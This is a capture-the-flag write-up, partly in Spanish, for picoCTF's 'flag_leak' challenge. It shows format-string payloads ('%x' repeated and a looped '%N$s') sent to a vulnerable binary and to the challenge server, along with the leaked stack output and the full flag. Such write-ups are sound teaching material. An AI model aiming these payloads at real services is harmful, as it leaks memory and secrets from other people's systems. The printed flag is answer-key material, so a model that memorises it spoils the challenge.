## Description

Story telling class 1/2I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/91/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/91/vuln.c). And connect with it using:`nc saturn.picoctf.net 49200`
#### Hints
- Format Strings
## Solución

```shell
┌──(kali㉿kali)-[~/…/categorias/Binary_Explotation/parte_01/flag_leak]
└─$ python3 -c 'print("%x"*60)' | ./vuln
Please create 'flag.txt' in this directory with your own debugging flag.
                                                                                                            
┌──(kali㉿kali)-[~/…/categorias/Binary_Explotation/parte_01/flag_leak]
└─$ nano flag.txt              
                                                                                                            
┌──(kali㉿kali)-[~/…/categorias/Binary_Explotation/parte_01/flag_leak]
└─$ python3 -c 'print("%x"*60)' | ./vuln
Tell me a story and then I'll tell you one >> Here's a story - 
ffaa81b0ffffffff8049346782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825f7f36f0080483386f6369707b4654436d6d75646c665f79a7d6761804c0008049430f7f36b60ffaa8298f7f12bf0f7ed98a0d544ad003e8804c000804943080494103e8804c000ffaa82988049418f7efa400003e8ffaa82b0
                                                                                                            
┌──(kali㉿kali)-[~/…/categorias/Binary_Explotation/parte_01/flag_leak]
└─$ python3 -c 'print("%x"*60)' | nc saturn.picoctf.net 63988
Tell me a story and then I'll tell you one >> Here's a story - 
ff9317c0ff9317e08049346782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825e852ed00e83b3ab06f6369707b4654436b34334c5f676e3167346c466666305f3474535f315f6b63623261317d613235fbad2000784d56000e856a990804c00080494100804c000ff9318a880494182ff931954ff9319600ff9318c0

```

![[Pasted image 20241111105021.png]]


## Solución 2
```shell
┌──(kali㉿kali)-[~/…/categorias/Binary_Explotation/parte_01/flag_leak]
└─$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 54241 | grep -Ei "pico|ctf" ; done
CTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}

```
## Bandera
```css
flag: picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
```
## Notas Adicionales

## Referencias
- 